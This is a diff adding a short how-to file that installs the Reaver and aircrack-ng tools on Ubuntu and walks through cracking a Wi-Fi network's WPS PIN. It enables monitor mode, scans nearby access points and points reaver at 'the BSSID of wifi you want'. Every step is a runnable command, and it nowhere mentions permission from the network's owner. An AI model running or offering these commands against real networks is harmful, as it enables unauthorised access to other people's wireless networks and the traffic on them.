@@ -1,0 +1,31 @@
+UBUNTU ONLY
+
+
+initial root 
+# sudo -s
+
+Download Reaver from internet
+
+
+Then open terminal and type
+# tar xvfz reaver-1.4.tar.gz
+or other version downloaded version
+
+# sudo apt-get install libpcap-dev
+#sudo apt-get install libsqlite3-dev
+
+enter folder
+#cd reaver-1.4/src
+#./configure
+#make
+#make install
+
+#sudo apt-get install aircrack-ng
+//mon0 should be replace with router type
+#airmon-ng start wlan0
+#airodump-ng mon0
+//use BSSID of wifi you want 
+#reaver -i mon0 -b 00:11:28:32:49:55
+
+// get BSSID of access point around without connect to access point directly
+#sudo iwlist scanning
